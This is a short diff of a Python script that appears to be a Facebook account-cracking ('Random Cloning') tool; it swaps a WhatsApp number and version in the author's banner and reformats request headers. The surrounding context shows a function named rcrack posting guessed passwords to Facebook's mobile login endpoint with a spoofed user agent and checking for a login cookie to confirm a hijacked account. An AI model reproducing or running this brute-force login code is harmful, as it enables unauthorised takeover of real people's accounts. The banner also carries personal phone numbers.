@@ -102,9 +102,9 @@ logo =("""\033[0;92m
 \033[0;93m╠══[Author:=======================> \33[1;38mMR. SHANTO\33[1;38m       ║\033[1;31m
 ╠══[Facebook:=====================> SHANTO MAFIA      ║  \033[1;97m
 ╠══[Github:=======================> \33[1;38mSHANTO-MAFIA      ║\33[1;34m
-╠══[Whatsapp:=====================> 01608843956     ║\33[1;35m
+╠══[Whatsapp:=====================> 01812631926     ║\33[1;35m
 ╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
-╠══[VERSION:======================> 1.0.2           ║\033[1;35m
+╠══[VERSION:======================> 0.1           ║\033[1;35m
 \033[0;92m╚═══════════════════════════════════════════════════╝\033[1;31m
     """) 
 loop = 0
@@ -242,8 +242,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-}
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
